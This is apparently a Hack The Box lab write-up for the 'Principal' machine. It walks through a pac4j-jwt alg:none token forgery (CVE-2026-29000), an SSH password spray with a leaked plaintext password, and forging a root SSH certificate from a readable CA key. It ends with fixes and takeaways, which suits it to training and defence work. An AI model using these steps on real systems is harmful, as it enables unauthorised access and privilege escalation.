## Summary

Principal is a Medium Linux machine whose web app uses **pac4j-jwt 6.0.3**,
vulnerable to an authentication bypass (CVE-2026-29000): the server decrypts the
JWE but fails to validate the inner JWT signature, so an `alg:none` token can be
forged with any role. Admin access leaks a deployment password, reused over SSH
(password spray) as `svc-deploy`. A misconfigured **SSH CA** (no
`AuthorizedPrincipalsFile`) lets any CA-signed certificate authenticate as
**root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Principal | Medium | Linux | Hack The Box |

## Attack Path

1. Nmap reveals SSH and a web application on port 8080.
2. The app is identified as pac4j-jwt.
3. An auth bypass is exploited (CVE-2026-29000).
4. An admin token is forged.
5. Credentials are extracted from the dashboard.
6. SSH access via password spray as `svc-deploy`.
7. A misconfigured SSH CA is abused.
8. A forged certificate grants root.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -T4 10.129.244.220
```

| Port | Service | Notes |
| --- | --- | --- |
| 22 | SSH | OpenSSH 9.6p1 |
| 8080 | HTTP | Jetty — uses pac4j-jwt 6.0.3 |

## Web Enumeration

The application at `http://10.129.244.220:8080` presented a login panel. Default
credentials failed, and the login request hit `/api/auth/login`.

Analyzing `/static/js/app.js` revealed the JWT scheme (JWE encryption + JWS
signature) and several endpoints:

```
/api/auth/login
/api/auth/jwks
/api/dashboard
/api/users
/api/settings
```

The `/api/auth/jwks` endpoint exposed the RSA public key used to encrypt the
JWT.

```bash
curl http://10.129.244.220:8080/api/auth/jwks | jq
```

## Exploitation — pac4j-jwt Auth Bypass (CVE-2026-29000)

The flaw: the server decrypts the JWE correctly but does not validate the inner
JWT signature. A token with `alg:none` has no signature, and the check is
skipped — allowing a forged token with an arbitrary role.

```bash
python3 cve.py http://10.129.244.220:8080
```

The script fetches the public key (JWKS), builds an `alg:none` JWT with
`sub=admin` and `role=ROLE_ADMIN`, wraps it in a valid JWE, and sends it:

```
Authenticated as: admin (ROLE_ADMIN)
```

Setting the token in `Session Storage → auth_token` granted full admin access
to the dashboard.

## Initial Access (User)

The admin dashboard listed users via `/api/users`. Under **Settings →
Security**, a password was exposed:

```
D3pl0y_$$H_Now42!
```

A password spray identified a valid SSH account:

```bash
nxc ssh 10.129.244.220 -u users.txt -p 'D3pl0y_$$H_Now42!'
```

```
svc-deploy → valid
ssh svc-deploy@10.129.244.220
```

The user flag lives at `/home/svc-deploy/user.txt`.

## Privilege Escalation

### Enumeration

`svc-deploy` belonged to the `deployers` group and could read a critical
directory:

```
/opt/principal/ssh
```

It contained the SSH CA private key (`ca`), `ca.pub`, and a README. The SSH
config trusted the CA:

```
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

Critically, there was **no `AuthorizedPrincipalsFile`**, so any certificate
signed by the CA is accepted with no identity validation.

### Forging a root certificate

```bash
ssh-keygen -t ed25519 -f /tmp/pwn -N ""
ssh-keygen -s /opt/principal/ssh/ca -I pwn-root -n root -V +1h /tmp/pwn.pub
```

This produced a valid certificate for the `root` principal:

```bash
ssh -i /tmp/pwn root@localhost
```

The root flag lives at `/root/root.txt`.

## Vulnerability Analysis

**JWT auth bypass (CVE-2026-29000)** — pac4j-jwt decrypted the JWE but skipped
inner JWT signature validation, accepting `alg:none` and allowing a forged admin
token. Fix: upgrade pac4j, explicitly reject `alg:none`, and always verify the
inner signature after decryption.

**Credential exposure** — a deployment password was readable in the admin
dashboard settings, enabling SSH access via password spray. Fix: never expose
secrets in application UI/responses and store them in a secrets manager.

**SSH CA misconfiguration** — `TrustedUserCAKeys` was set without
`AuthorizedPrincipalsFile`, and the CA private key was readable, allowing forging
a certificate for any principal including root. Fix: protect the CA private key,
define `AuthorizedPrincipalsFile`, and constrain certificate principals.

## Tools Used

- Nmap
- curl
- Python 3
- jwcrypto
- NetExec
- SSH

## Key Takeaways

- Signature validation is critical in JWT; encryption without identity validation is useless.
- `alg:none` handling must be explicitly rejected.
- A misconfigured SSH CA (or a readable CA key) compromises the whole trust chain.
- Trust chains are common, high-value targets in real engagements.
